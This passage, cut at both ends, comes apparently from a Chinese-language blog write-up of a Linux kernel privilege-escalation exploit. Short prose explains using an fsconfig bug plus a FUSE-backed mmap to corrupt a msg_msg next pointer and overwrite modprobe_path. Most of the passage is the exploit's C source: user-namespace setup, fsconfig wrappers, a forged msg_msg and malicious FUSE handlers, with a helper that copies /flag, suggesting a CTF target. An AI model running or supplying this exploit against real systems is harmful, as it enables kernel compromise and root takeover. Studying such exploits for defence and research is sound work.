(copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line"><span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">len -= alen;</span><br><span class="line">src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line"><span class="keyword">goto</span> out_err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = security_msg_msg_alloc(msg);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">free_msg(msg);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥æ³¨æ„åˆ°çš„æ˜¯åœ¨å¯¹<code>msg_msg</code>å†™å®Œä¹‹åä¼šè¿›å…¥ä¸‹é¢çš„forå¾ªç¯ï¼Œå…¶ä¼šæ ¹æ®<code>next</code>æŒ‡é’ˆç„¶åå†è¿›è¡Œå†™ï¼Œåé¢çš„å†™å°±æ˜¯å†™å…¥åˆ°<code>msg_msgseg</code>ç»“æ„ä½“ä¸­äº†ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿåœ¨ç¬¬ä¸€æ¬¡å†™çš„æ—¶å€™ä¿®æ”¹æ‰<code>msg_msg-&gt;next</code>æŒ‡é’ˆå³å¯å®ç°ä»»æ„åœ°å€å†™äº†ã€‚</p><p>é¢å¯¹ä¸Šé¢çš„æ€è·¯ï¼Œä½¿ç”¨<code>userfaultfd</code>æ˜¯å¾ˆæ˜æ˜¾å¯ä»¥å®ç°çš„ï¼Œä¸è¿‡æ—¢ç„¶è¿™ç¯‡æ–‡ç« æåˆ°äº†<code>FUSE</code>é‚£ä¹ˆè¿™é‡Œè‚¯å®šå°±ä½¿ç”¨<code>FUSE</code>äº†ï¼Œä¸è¿‡æ€è·¯éƒ½æ˜¯ä¸€æ ·çš„ã€‚æ‰€ä»¥è¿™é‡Œçš„æ•´ä½“æ€è·¯å°±æ˜¯é€šè¿‡<code>mmap</code>åˆ›å»ºä¸¤å—è¿ç»­çš„å†…å­˜åŒºåŸŸï¼Œè®©åä¸€å—å†…å­˜åŒºåŸŸå’Œ<code>FUSE</code>æŒ‚è½½ç‚¹ä¸‹çš„æ–‡ä»¶åšæ˜ å°„ï¼Œé‚£ä¹ˆåœ¨è¯»å–ä¸‹ä¸€å—å†…å­˜æ—¶å°±ä¼šè¿›å…¥åˆ°æˆ‘ä»¬é¢„å…ˆå†™åˆ°çš„<code>read</code>å‡½æ•°ä¸­å»äº†ï¼Œåœ¨è¿™ä¸ªå¤„ç†å‡½æ•°ä¸­ä½¿ç”¨<code>fsconfig</code>ä¸­çš„æ¼æ´å»ä¿®æ”¹æ‰<code>msg_msg-&gt;next</code>æŒ‡é’ˆï¼Œåœ¨ç»“æŸå¤„ç†å‡½æ•°ä¹‹åå°±ä¼šç»§ç»­å¾€å·²ç»è¢«æˆ‘ä»¬ä¿®æ”¹çš„æŒ‡é’ˆåœ°å€å†™å…¥å†…å®¹äº†ï¼Œå®Œæˆäº†ä»»æ„åœ°å€å†™ã€‚è¿™é‡Œå› ä¸ºåªæ³„æ¼äº†å†…æ ¸åŸºåœ°å€æ‰€ä»¥è¿™é‡Œå†™çš„åœ°æ–¹ä¹Ÿé€‰æ‹©çš„æ˜¯<code>modprobe_path</code>è¿›è¡Œææƒã€‚</p><h3 id="ç»¼ä¸Šå¯å¾—exp"><a href="#ç»¼ä¸Šå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šå¯å¾—exp"></a>ç»¼ä¸Šå¯å¾—exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUSE_USE_VERSION 34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fuse.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 0x50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEQ_FILE_NUM 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;  <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_mod</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;mkdir -p /tmp&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;cp /flag /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/copy.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xFF\\xFF\\xFF\\xFF&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">uid_t</span> uid, <span class="keyword">gid_t</span> gid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(temp, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(temp);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> exp_fs_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *evil_path = <span class="string">&quot;evil&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">change_next</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fake_msg[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_list.next = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_list.prev = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_type = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_ts = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;next = modprobe_path;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;security = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, fake_msg + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[<span class="number">1</span>], <span class="string">&#x27;A&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_read</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> size, <span class="keyword">off_t</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">              struct fuse_file_info *fi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> evil_buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">char</span> rev;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset &gt;= <span class="number">0x1000</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (offset + size &gt; <span class="number">0x1000</span>)</span><br><span class="line">        size = <span class="number">0x1000</span> - offset;</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(evil_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(evil_buf));</span><br><span class="line">    <span class="built_in">strcpy</span>(evil_buf, <span class="string">&quot;/tmp/shell.sh&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, evil_buf + offset, size);</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;rev, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_getattr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, struct stat *stbuf,</span></span></span><br><span class="line"><span class="params"><span class="function">                 struct fuse_file_info *fi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(stbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct stat));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path, <span class="string">&quot;/&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        stbuf-&gt;st_mode = S_IFDIR | <span class="number">0755</span>;</span><br><span class="line">        stbuf-&gt;st_nlink = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path + <span class="number">1</span>, evil_path) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        stbuf-&gt;st_mode = S_IFREG | <span class="number">0666</span>;</span><br><span class="line">        stbuf-&gt;st_nlink = <span class="number">1</span>;</span><br><span class="line">        stbuf-&gt;st_size = <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        res = -ENOENT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_readdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">void</span> *buf, <span class="keyword">fuse_fill_dir_t</span> filler,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">off_t</span> offset, struct fuse_file_info *fi,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">enum</span> fuse_readdir_flags flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path, <span class="string">&quot;/&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">    filler(buf, <span class="string">&quot;.&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    filler(buf, <span class="string">&quot;..&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    filler(buf, evil_path, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span 